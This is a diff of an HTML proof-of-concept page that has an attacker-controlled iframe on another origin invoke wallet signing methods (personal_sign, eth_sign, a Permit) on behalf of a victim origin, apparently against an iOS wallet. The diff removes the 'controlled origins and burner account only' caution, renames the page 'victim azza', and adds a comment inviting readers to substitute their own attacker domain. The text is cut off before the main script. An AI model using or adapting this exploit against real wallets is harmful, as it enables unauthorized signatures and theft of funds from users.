@@ -1,29 +1,29 @@
 <!doctype html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Core iOS cross-origin authorization PoC</title>
+<title>victim azza</title>
 <style>
 html,body{background:#fff;color:#101010}body{max-width:720px;margin:24px auto;padding:0 18px;font:17px/1.5 system-ui}h2{font-size:26px;line-height:1.2}button{display:block;width:100%;margin:9px 0;padding:14px;background:#fff;color:#111;border:2px solid #111;border-radius:6px;text-align:left;font:700 16px system-ui}button:disabled{color:#777;border-color:#aaa}.valid{padding:13px;background:#fff;border:3px solid #b00020;color:#8b0018;font-weight:800}pre{padding:14px;background:#fff;color:#111;border:2px solid #555;font:14px/1.45 ui-monospace,monospace;white-space:pre-wrap;overflow-wrap:anywhere}iframe{width:100%;height:72px;background:#fff;border:2px solid #555}
 </style>
 
-<h2>Core iOS cross-origin authorization PoC</h2>
+<h2>Cross Origin Authorization</h2>
 <p>Victim A: <b id="originA"></b><br>Attacker B: <b id="originB"></b></p>
-<p>Controlled origins and burner account only. Reject every signing request.</p>
+<p>Reject every signing request</p>
 
 <button id="connect">1. Connect Origin A</button>
-<button id="permissions" disabled>2. B invokes wallet_getPermissions as A</button>
-<button id="personal" disabled>3. B invokes personal_sign as A — REJECT</button>
-<button id="blind" disabled>4. B invokes eth_sign over its digest as A — REJECT</button>
-<button id="permit" disabled>5. B invokes expired dummy Permit as A — REJECT</button>
+<button id="permissions" disabled>2.  invokes wallet_getPermissions as A</button>
+<button id="personal" disabled>3.  invokes personal_sign as A -> REJECT</button>
+<button id="blind" disabled>4.  invokes eth_sign over its digest as A -> REJECT</button>
+<button id="permit" disabled>5.  invokes expired dummy Permit as A -> REJECT</button>
 
 <p id="verdict" class="valid" hidden></p>
-<pre id="log">Loading controlled Origin B…</pre>
+<pre id="log">load...</pre>
 <iframe id="attacker" title="Controlled Origin B"></iframe>
 
 <script>
 'use strict';
 
-const ATTACKER_URL='https://azza1231.github.io/pocpoc/attacker.html';
+const ATTACKER_URL='https://azza1231.github.io/pocpoc/attacker.html'; // you can replace this attacker URL with your own domain
 const IDS={permissions:733731,personal:733732,blind:733733,permit:733734};
 const $=id=>document.getElementById(id);
 const frame=$('attacker');
